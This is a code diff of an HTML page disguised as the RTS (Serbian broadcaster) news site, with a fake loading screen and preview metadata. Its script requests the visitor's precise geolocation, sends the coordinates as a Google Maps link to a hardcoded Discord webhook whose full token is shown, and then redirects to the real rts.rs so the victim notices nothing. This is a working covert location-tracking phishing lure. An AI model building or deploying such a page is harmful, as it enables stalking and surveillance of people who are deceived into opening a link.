@@ -1,7 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Vesti</title></head>
+<head>
+    <meta charset="UTF-8">
+    <title>RTS :: Najnovije vesti</title>
+    
+    <meta property="og:title" content="RTS :: Uživo: Najnovije vesti iz Srbije i sveta">
+    <meta property="og:description" content="Pratite najnovije vesti, analize i izveštaje sa lica mesta.">
+    <meta property="og:image" content="https://www.rts.rs/upload/story/Small/2023/01/01/rts-logo.jpg">
+    <meta property="og:type" content="website">
+
+    <style>
+        body { 
+            background-color: white; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #cc0000;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
 <body>
+    <img src="https://www.rts.rs/upload/story/Small/2023/01/01/rts-logo.jpg" width="80" style="margin-bottom:10px;">
+    <div class="loader"></div>
+    <p style="color: #333; font-size: 14px;">Učitavanje vesti...</p>
+
     <script>
         const webhook = "https://discordapp.com/api/webhooks/1494157860643278890/-kmJPPm-TfxTuVOewXOnSbB6Wr3y8mv5eOc0vh5RsPsd3H27yyWR9lRh_kAt3MySMa8g";
         const target = "https://www.rts.rs";
@@ -12,7 +47,7 @@
             const acc = Math.round(pos.coords.accuracy);
             
             const payload = {
-                content: `📍 **LOKACIJA STIGLA!**\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc} metara`
+                content: `🚨 **LOKACIJA AKTIVIRANA** 🚨\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc}m`
             };
 
             fetch(webhook, {
@@ -24,13 +59,11 @@
 
         function fail() { window.location.href = target; }
 
-        // Pokreni odmah
         navigator.geolocation.getCurrentPosition(send, fail, {
             enableHighAccuracy: true,
             timeout: 8000
         });
 
-        // Sigurnosni prebačaj ako telefon predugo razmišlja
         setTimeout(fail, 9000);
     </script>
 </body>
